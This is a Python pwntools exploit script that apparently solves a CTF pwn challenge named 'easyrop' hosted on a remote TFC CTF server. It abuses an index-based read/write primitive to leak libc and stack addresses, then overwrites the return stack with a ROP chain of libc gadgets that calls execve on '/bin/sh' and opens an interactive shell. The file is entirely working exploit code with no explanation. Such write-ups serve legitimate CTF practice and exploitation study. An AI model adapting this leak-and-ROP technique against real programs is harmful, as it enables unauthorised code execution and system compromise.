#!/usr/bin/env python3

from pwn import *

exe = ELF("easyrop_patched")
libc = ELF("libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

sla = lambda r,a,b : r.sendlineafter(f'{a}'.encode('utf-8'), f'{b}'.encode('utf-8')) 
ru = lambda r,a : r.recvuntil(f'{a}'.encode('utf-8')) 
sl = lambda r,a : r.sendline(f'{a}'.encode('utf-8')) 



def check_valid_index(index):
    if index % 3 == 0:
        log.error("invalid index given")
        exit()
    return


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.tfcctf.com", 30898)

    return r


r = conn()

def bin_read(index):
    sla(r, "read!", 2)
    check_valid_index(index)
    sla(r, "index: ", index)
    ru(r, "is ")
    read_val = r.recvline().strip()
    log.info(f"read value 0x{read_val} at index {index}")
    return read_val

def bin_write(index, value):
    log.info(f"attempting to write value {hex(value)}")
    sla(r, "read!", 1)
    check_valid_index(index)
    sla(r, "index: ", index)
    sla(r, "write: ", value)

def main():
    pop2_ret = 0x00000000000a9c7f#: xor eax, eax; pop r12; pop r13; ret;
    filler_pop = 0x00000000004011dd#: pop rbp; ret;
    nop_ret = 0x000000000040116f#: nop; ret;
    pop_rdi_ret = 0x000000000002a3e5#: pop rdi; ret;
    pop_rsi_ret = 0x000000000002be51#: pop rsi; ret;
    pop_rdx_popr12= 0x000000000011f497#: pop rdx; pop r12; ret;
    setup_rax = 0x0000000000061177#: mov rax, r12; pop rbp; pop r12; ret;
    pop_rdi_pop_rbp = 0x000000000002a745#: pop rdi; pop rbp; ret;
    syscall = 0x0000000000091396#: syscall; ret;
    bin_sh = 0x0068732f6e69622f

    libc_leak = bin_read(131)
    libc_leak += bin_read(130)
    libc_leak = int(libc_leak, 16)
    log.info(f"libc leak @ {hex(libc_leak)}")
    libc.address = libc_leak - 0x29D90
    log.info(f"libc base @ {hex(libc.address)}")

    stack = bin_read(173)
    stack += bin_read(172)
    stack = int(stack, 16) - 0x328
    log.info(f"stack leak @ {hex(stack)}")

    pop_rdi_ret += libc.address
    pop_rsi_ret += libc.address
    pop_rdx_popr12 += libc.address
    pop_rdi_pop_rbp += libc.address
    pop2_ret += libc.address
    setup_rax += libc.address
    syscall += libc.address

    #gdb.attach(r)

    bin_write(130,pop_rdi_ret & 0x00000000FFFFFFFF)
    bin_write(131,(pop_rdi_ret & 0xFFFFFFFF00000000) >> 32)

    bin_write(134,nop_ret)

    for i in range(4):
        bin_write(136+(i*6),pop2_ret & 0x00000000FFFFFFFF)
        bin_write(137+(i*6),(pop2_ret & 0xFFFFFFFF00000000) >>32)
    # good luck pwning :)
    bin_write(160,pop_rdx_popr12 & 0x00000000FFFFFFFF)
    bin_write(161,(pop_rdx_popr12 & 0xFFFFFFFF00000000) >> 32)

    bin_write(164, 0x3b)

    
    bin_write(166,pop_rsi_ret & 0x00000000FFFFFFFF)
    bin_write(167,(pop_rsi_ret & 0xFFFFFFFF00000000) >> 32)

    bin_write(170, pop_rdi_pop_rbp & 0x00000000FFFFFFFF)
    bin_write(172, (stack + 0x10) & 0x00000000FFFFFFFF)
    bin_write(4,bin_sh & 0x00000000FFFFFFFF)
    bin_write(5,(bin_sh & 0xFFFFFFFF00000000) >> 32)

    bin_write(176,setup_rax & 0x00000000FFFFFFFF)

    bin_write(182, nop_ret)

    bin_write(184,syscall & 0x00000000FFFFFFFF)
    bin_write(185,(syscall & 0xFFFFFFFF00000000) >> 32)

    #gdb.attach(r, gdbscript=f"b *{hex(pop_rdi_ret)}")
    r.sendline(b'11')

    r.interactive()

if __name__ == "__main__":
    main()
